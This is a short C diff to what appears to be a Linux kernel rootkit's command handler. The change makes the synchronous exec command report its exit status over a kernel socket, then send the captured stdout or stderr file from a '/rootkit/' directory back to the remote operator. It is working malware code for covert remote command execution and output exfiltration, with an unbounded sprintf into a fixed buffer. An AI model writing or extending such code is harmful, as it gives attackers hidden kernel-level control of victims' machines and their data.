@@ -95,6 +95,7 @@ static int do_exec_sync(struct socket *sock, char *args)
 {
     USE_NETWORK(128)
     int ret;
+    char out_file[265] = { 0 };
 
     if ((ret = exec_sync(args, &status)) != 0)
     {
@@ -102,22 +103,24 @@ static int do_exec_sync(struct socket *sock, char *args)
         sprintf(buf, "couldn't exec. internal error code %d\n", ret);
     }
     sprintf(buf, "execed command successfully. status: %d\n", status);
-    if (status == 0)
-    {
-        // TODO: send last stdout bytes
-    }
-    else
-    {
-        // TODO: send last stderr bytes
-    }
+
+    // Send status code:
     vec.iov_base = buf;
     vec.iov_len = strlen(buf);
-    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    if ((ret = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
     {
-        pr_warn("commands: couldn't send hide status message: %d\n", status);
+        pr_warn("commands: couldn't send hide status message: %d\n", ret);
         return -1;
     }
-    return 0;
+
+    // Send output using file download:
+    if (status == 0)
+    {
+        sprintf(out_file, "/rootkit/%s", get_last_outfile());
+        return do_download(sock, out_file);
+    }
+    sprintf(out_file, "/rootkit/%s", get_last_errfile());
+    return do_download(sock, out_file);
 }
 
 static int do_exec_async(struct socket *sock, char *args)
